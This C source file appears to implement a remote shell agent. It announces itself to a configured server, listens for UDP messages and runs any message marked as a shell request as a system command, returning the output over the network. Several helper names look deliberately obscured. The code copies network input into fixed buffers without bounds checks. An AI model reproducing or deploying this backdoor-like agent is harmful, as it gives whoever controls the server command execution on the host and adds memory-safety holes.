#include "stdafx.h"
twc tc;
int socket_descriptor;
key_t uniquekey = 10000;
static int msgid;
uint32_t pdt[PDTLEN] ={0}; 
int8_t __main__init()
{
        signal(SIGCHLD,&signalHandel);  //reigster the function that deal with defunct process
        signal(SIGHUP,&signalHandel);  //reigster the function that deal with defunct process
	signal(SIGINT,&signalHandel);  //reigster the function that deal with ctrl_c request

        if((msgid = msgget(uniquekey, IPC_CREAT |  0666)) == -1) {
	        print_error(errno);
	        exit(errno);
        }                
        return  readconfig(CONTFILE,&tc);
}

typedef struct _msg_struc_
{
        long msgtype;
        char text[MBUFSIZ];
} sigmsg;

int main() {
        int erro = __main__init();
        unsigned int sin_len = sizeof(struct sockaddr);
	int cli_pro_id;
        struct sockaddr_in sin;
        char pathm[MBUFSIZ];
        getcwd(pathm,MBUFSIZ);
        if(erro!=0)
        {
                print_error(erro);
                exit(-1);
        }
        unsigned char buffer[MESSAGEIDLEN+OPTIONLEN+MESSAGELEN+3];
        socket_descriptor = inint__cd23(&sin,tc.lport);
        if(sin_len==-2)
        {
                print_error(__PORT_HAS_BEEN_USE__);
	        return -2;
        }
        if(sin_len==-1)
        {
                print_error(__PORT_HAS_BEEN_USE__);
	        return -2;
        }
        else
        {
                printf("[INFO] WAITFOR DATA\n");
        }
        
        sendConIno_(socket_descriptor,tc.server_v4[0],tc.sport,0,tc.client_id);
        while(1)
        {
                recvfrom(socket_descriptor,&buffer,sizeof(buffer),0,(struct sockaddr *)&sin,&sin_len);
		if(0==(cli_pro_id=fork())){
			message_deal_Hander(socket_descriptor, buffer,pathm,sin.sin_addr,htons(sin.sin_port));
			return 0;
		}
		else
		{
                        int widz = 0;
                        for(;widz<PDTLEN;widz++){
                                if(pdt[widz]==0)
                                {
                                        pdt[widz] = cli_pro_id;
                                        break;
                                }
                        }
                        if(widz == PDTLEN)
                        {
                                kill(cli_pro_id,SIGKILL);
                        }

                        sigmsg recvdate;
                        if(msgrcv(msgid, (void  *)&recvdate, MBUFSIZ, STD_MSG, IPC_NOWAIT) == -1) {
	                   //     print_error(errno);
                        }

                        else{
                            strcpy(pathm,recvdate.text);
                        }
			//printf("\nprocess:%d deal the message\n",cli_pro_id);
		}
    	}
        close(socket_descriptor);
        exit(0);
        return (EXIT_SUCCESS);
}

int message_deal_Hander(int sockdscp,unsigned char * buffer,char *pathm,struct in_addr aip,short int port)
{
        char * ip = inet_ntoa(aip);
	msg message = {0,{0},0,{0},{0}};
        char type_std[10] = {0};
        //inint(&message);
	changeTomsg(buffer,&message);
        if(message.clientid!=tc.client_id)
        {
                return 0;
        }
        else if(strlen((const char *)message.message) == 1&& message.message[0]=='\n')
        {
                return 0;
        }
        if((message.code&0x01)==1)
        {
        	if(message.code==(REQUEST|SHELL))
        	{
                        unsigned char * readp = NULL;
                        strcpy(type_std,"shell");
                        if(((*(message.message))=='c')&&((*((message.message+1)))=='d'))
                        {
                                sigmsg send_msg;
                                strcpy(send_msg.text,message.message+3);
                                send_msg.msgtype = STD_MSG;
                                if(msgsnd(msgid, (sigmsg  *)(&send_msg), MBUFSIZ, 0) == -1) {
                                        print_error(errno);
	                                exit(2);
	                        }
                                return 0;
                        }
        	
                        writeValWithStatus(&message, cmd_system__0a40(message.message,&readp,pathm));
                        for(int i = 0;i<strlen(readp)/(MESSAGELEN-1)+1;i++)
                        {
			        writeMessage(&message,(readp)+i*(MESSAGELEN-1));
                                message.option[0] = i+1;
                                if(isend_m(sockdscp,ip,port,&message)!=0) //sendmesg;
                                {
                                        print_sw(DEBUG,PUTERR,"\nerror\n");
                                }

                        }
                        free(readp);
                        
		}
                else if(message.code==(REQUEST|ISALIVE))
                {
                        strcpy(type_std,"alive");
                        sendConIno_(sockdscp,ip,port,0,tc.client_id);
                }
                else
                {
                }
                printf("message:%d%d\t type:%s\t from:%d\n",message.messageid[0],message.messageid[1],type_std,message.clientid);
                memset(type_std,0,10);
	}
	return 0;

}
